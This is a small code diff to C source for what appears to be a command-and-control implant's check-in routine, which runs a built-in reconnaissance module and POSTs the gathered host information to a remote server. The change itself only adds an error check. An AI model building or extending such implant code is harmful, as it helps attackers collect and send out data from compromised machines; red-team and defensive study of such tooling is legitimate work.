@@ -84,7 +84,9 @@ BOOL perform_checkin(AgentState *state, CheckinReply *reply) {
 	
 	// Use the checkin PICO to gather basic situational awareness info, if possible.
 	ResolvedPico pico = { 0 };
-	resolve_loaded_pico(&state->file_vault, &pico, "_builtin_checkin");
+	BOOL result = resolve_loaded_pico(&state->file_vault, &pico, "_builtin_checkin");
+	if (result == FALSE) { return FALSE; }
+	
 	CHECKIN_PICO entrypoint = (CHECKIN_PICO) pico.entrypoint;
 	entrypoint(&checkin);
 	
@@ -94,7 +96,7 @@ BOOL perform_checkin(AgentState *state, CheckinReply *reply) {
 	HttpBody body = {(unsigned char *) msg, MSVCRT$strlen(msg)};
 	HttpResponse response = {0};
 	
-	BOOL result = HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
+	result = HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
 	
 	// If we get a 200 response code, parse the reply.
 	if (result == TRUE && response.status_code == 200) {
